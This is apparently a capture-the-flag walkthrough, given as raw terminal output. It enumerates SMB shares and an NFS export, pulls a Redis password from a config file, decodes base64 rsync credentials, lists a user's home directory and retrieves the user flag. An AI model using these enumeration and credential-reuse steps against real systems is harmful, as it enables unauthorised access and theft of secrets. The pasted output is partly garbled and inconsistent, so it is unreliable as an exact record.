┌──(root㉿kali)-[~]
└─# sudo smbclient -L 10.10.21.154
Password for [WORKGROUP\root]:

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    shares          Disk      VulnNet Business Shares
    IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

    Server               Comment
    ---------            -------

    Workgroup            Master
    ---------            -------
    WORKGROUP     
──(root㉿kali)-[~]
└─# smbclient //10.10.21.154/shares
Password for [WORKGROUP\root]:
Try “help” to get a list of possible commands.

smb: > ls
. D 0 Tue Feb 2 14:50:09 2021
… D 0 Tue Feb 2 14:58:11 2021
temp D 0 Sat Feb 6 17:15:10 2021
data D 0 Tue Feb 2 14:57:33 2021
cd dat
11309648 blocks of size 1024. 3277596 blocks available

smb: \temp> ls
. D 0 Sat Feb 6 17:15:10 2021
… D 0 Tue Feb 2 14:50:09 2021
services.txt N 38 Sat Feb 6 17:15:09 2021
cat servid
11309648 blocks of size 1024. 3277360 blocks available
smb: \temp> get services.txt
getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

showmount -e 10.10.238.66
Export list for 10.10.238.66:
/opt/conf *

└─$ tree
.
├── hp
│ └── hplip.conf
├── init
│ ├── anacron.conf
│ ├── lightdm.conf
│ └── whoopsie.conf
├── opt
├── profile.d
│ ├── bash_completion.sh
│ ├── cedilla-portuguese.sh
│ ├── input-method-config.sh
│ └── vte-2.91.sh
├── redis
│ └── redis.conf
├── vim
│ ├── vimrc
│ └── vimrc.tiny
└── wildmidi
└── wildmidi.cfg

7 directories, 12 files

inside redis file we got
requirepass “B65Hx562F@ggAZ@F”

──(root㉿kali)-[/]
└─# echo QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v

┌──(root㉿kali)-[/rsync]
└─# rsync --list-only rsync://rsync-connect@10.10.65.34/files
Password:
drwxr-xr-x 4,096 2021/02/01 18:21:14 .
drwxr-xr-x 4,096 2021/02/06 18:19:29 sys-internal

┌──(root㉿kali)-[/rsync]
└─# rsync --list-only rsync://rsync-connect@10.10.65.34/files/sys-internal/
Password:
drwxr-xr-x 4,096 2021/02/06 18:19:29 .
-rw------- 61 2021/02/06 18:19:28 .Xauthority
lrwxrwxrwx 9 2021/02/01 19:03:19 .bash_history
-rw-r–r-- 220 2021/02/01 18:21:14 .bash_logout
-rw-r–r-- 3,771 2021/02/01 18:21:14 .bashrc
-rw-r–r-- 26 2021/02/01 18:23:18 .dmrc
-rw-r–r-- 807 2021/02/01 18:21:14 .profile
lrwxrwxrwx 9 2021/02/02 19:42:29 .rediscli_history
-rw-r–r-- 0 2021/02/01 18:24:03 .sudo_as_admin_successful
-rw-r–r-- 14 2018/02/13 00:39:01 .xscreensaver
-rw------- 2,546 2021/02/06 18:19:35 .xsession-errors
-rw------- 2,546 2021/02/06 17:10:13 .xsession-errors.old
-rw------- 38 2021/02/06 17:24:25 user.txt
drwxrwxr-x 4,096 2021/02/02 14:53:00 .cache
drwxrwxr-x 4,096 2021/02/01 18:23:57 .config
drwx------ 4,096 2021/02/01 18:23:19 .dbus
drwx------ 4,096 2021/02/01 18:23:18 .gnupg
drwxrwxr-x 4,096 2021/02/01 18:23:22 .local
drwx------ 4,096 2021/02/01 19:07:15 .mozilla
drwxrwxr-x 4,096 2021/02/06 17:13:14 .ssh
drwx------ 4,096 2021/02/02 16:46:16 .thumbnails
drwx------ 4,096 2021/02/01 18:23:21 Desktop
drwxr-xr-x 4,096 2021/02/01 18:23:22 Documents
drwxr-xr-x 4,096 2021/02/01 19:16:46 Downloads
drwxr-xr-x 4,096 2021/02/01 18:23:22 Music
drwxr-xr-x 4,096 2021/02/01 18:23:22 Pictures
drwxr-xr-x 4,096 2021/02/01 18:23:22 Public
drwxr-xr-x 4,096 2021/02/01 18:23:22 Templates
drwxr-xr-x 4,096 2021/02/01 18:23:22 Videos

┌──(root㉿kali)-[/rsync]
└─# rsync rsync://rsync-connect@10.10.65.34/files/sys-internal/user.txt /rsync/
Password:

┌──(root㉿kali)-[/rsync]
└─# ls
user.txt

┌──(root㉿kali)-[/rsync]
└─# cat user.txt
THM{da7c20696831f253e0afaca8b83c07ab}